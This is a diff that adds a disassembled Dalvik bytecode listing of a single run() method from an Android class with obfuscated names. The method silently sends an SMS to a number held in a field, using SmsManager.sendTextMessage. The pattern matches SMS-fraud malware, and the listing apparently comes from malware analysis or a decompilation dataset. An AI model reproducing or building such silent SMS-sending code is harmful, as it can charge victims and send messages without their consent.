@@ -1,0 +1,18 @@
+# LQueiD9ej/ezahS1gi/udHkT0;->run()V [access_flags=public final]
+#
+# Parameters:
+# local registers: v0...v6
+#
+# - return:void
+
+run-BB@0x0 : 
+	0       (00000000) const/4              v2, 0
+	1       (00000002) invoke-static        Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;
+	2       (00000008) move-result-object   v0
+	3       (0000000a) iget-object          v1, v6, LQueiD9ej/ezahS1gi/udHkT0;->A8xb Ljava/lang/String;
+	4       (0000000e) iget-object          v3, v6, LQueiD9ej/ezahS1gi/udHkT0;->UgmlJgeQci Ljava/lang/String;
+	5       (00000012) move-object          v4, v2
+	6       (00000014) move-object          v5, v2
+	7       (00000016) invoke-virtual/range v0 ... v5, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Landroid/app/PendingIntent; Landroid/app/PendingIntent;)V
+	8       (0000001c) return-void          
+
